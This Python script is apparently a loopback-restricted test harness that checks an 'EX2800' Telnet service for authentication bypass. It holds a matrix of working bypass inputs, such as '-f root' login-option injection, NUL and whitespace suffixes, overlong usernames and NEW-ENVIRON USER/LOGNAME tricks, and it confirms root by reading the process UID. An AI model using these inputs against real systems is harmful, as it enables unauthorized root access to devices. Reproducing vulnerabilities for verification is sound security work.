#!/usr/bin/env python3
"""Loopback-only, bounded EX2800 Telnet authentication-bypass probe."""

import argparse
import ipaddress
import re
import socket
import telnetlib
import time


def loopback(value: str) -> str:
    address = ipaddress.ip_address(socket.gethostbyname(value))
    if not address.is_loopback:
        raise argparse.ArgumentTypeError("target must resolve to loopback")
    return str(address)


def attempt(
    target: str,
    port: int,
    username: bytes,
    password: bytes,
    preamble: bytes = b"",
) -> bytes:
    client = telnetlib.Telnet(target, port, 3)
    if preamble:
        client.get_socket().sendall(preamble)
    transcript = client.read_until(b"login:", 2)
    client.write(username + b"\r\n")
    transcript += client.read_until(b"Password:", 2)
    client.write(password + b"\r\n")
    time.sleep(0.7)
    try:
        transcript += client.read_very_eager()
        client.write(
            b'while IFS= read -r line; do case "$line" in Uid:*) '
            b'echo "$line";; esac; done < /proc/self/status\r\n'
        )
        time.sleep(0.5)
        transcript += client.read_very_eager()
    except (EOFError, BrokenPipeError):
        transcript += b"<EOF>"
    client.close()
    return transcript


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", type=loopback, default="127.0.0.1")
    parser.add_argument("--port", type=int, default=23)
    args = parser.parse_args()

    iac, will, sb, se = b"\xff", b"\xfb", b"\xfa", b"\xf0"
    new_environ, is_, var, value = b"\x27", b"\x00", b"\x00", b"\x01"

    def environ(name: bytes, setting: bytes) -> bytes:
        return (
            iac + will + new_environ
            + iac + sb + new_environ + is_ + var + name + value + setting
            + iac + se
        )

    cases = [
        ("root_blank", b"root", b"", b""),
        ("commented_root_blank", b"#root", b"", b""),
        ("login_f_separate", b"-f root", b"", b""),
        ("login_f_joined", b"-froot", b"", b""),
        ("login_preserve", b"-p", b"", b""),
        ("double_dash", b"--", b"", b""),
        ("root_space", b"root ", b"", b""),
        ("root_tab", b"root\t", b"", b""),
        ("root_nul_suffix", b"root\x00ignored", b"", b""),
        ("root_cr_suffix", b"root\rroot", b"", b""),
        ("empty_user_blank", b"", b"", b""),
        ("long_user_256", b"A" * 256, b"", b""),
        ("long_user_1024", b"A" * 1024, b"", b""),
        ("env_user_root", b"", b"", environ(b"USER", b"root")),
        ("env_user_froot", b"", b"", environ(b"USER", b"-f root")),
        ("env_logname_root", b"", b"", environ(b"LOGNAME", b"root")),
        ("env_shell_sh", b"root", b"", environ(b"SHELL", b"/bin/sh")),
    ]
    bypass = False
    service_survived = True
    for name, username, password, preamble in cases:
        try:
            transcript = attempt(
                args.target, args.port, username, password, preamble
            )
        except (EOFError, OSError, socket.timeout):
            transcript = b"<CONNECTION_CLOSED>"
        root = bool(re.search(rb"Uid:\s+0\s+0\s+0\s+0", transcript))
        print(f"{name}_uid0={str(root).lower()}")
        bypass |= root
        try:
            with socket.create_connection((args.target, args.port), timeout=1):
                pass
        except OSError:
            service_survived = False
    print(f"authentication_bypass_reproduced={str(bypass).lower()}")
    print(f"telnet_service_survived_matrix={str(service_survived).lower()}")
    return 1 if bypass else 0


if __name__ == "__main__":
    raise SystemExit(main())
